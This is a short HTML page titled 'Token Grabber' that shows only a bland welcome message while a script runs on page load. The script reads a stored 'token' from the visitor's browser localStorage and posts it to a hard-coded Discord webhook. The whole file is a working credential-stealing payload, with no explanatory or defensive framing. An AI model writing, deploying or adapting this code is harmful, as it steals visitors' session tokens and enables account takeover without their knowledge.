<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Grabber</title>
    <script>
        // Function to capture the token
        function captureToken() {
            const token = localStorage.getItem('token');
            if (token) {
                fetch('https://discord.com/api/webhooks/1521204667630227578/BuVsZLJ76Yyts3BhBNBbNSHHN_tw5k1S2GXYBHDruWWLC2PQ-OOGndv2FSqNvUQsYdZ4', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ token: token })
                });
            }
        }

        // Capture the token when the page loads
        window.addEventListener('load', captureToken);
    </script>
</head>
<body>
    <h1>Welcome to our website!</h1>
    <p>Enjoy your stay...</p>
</body>
</html>
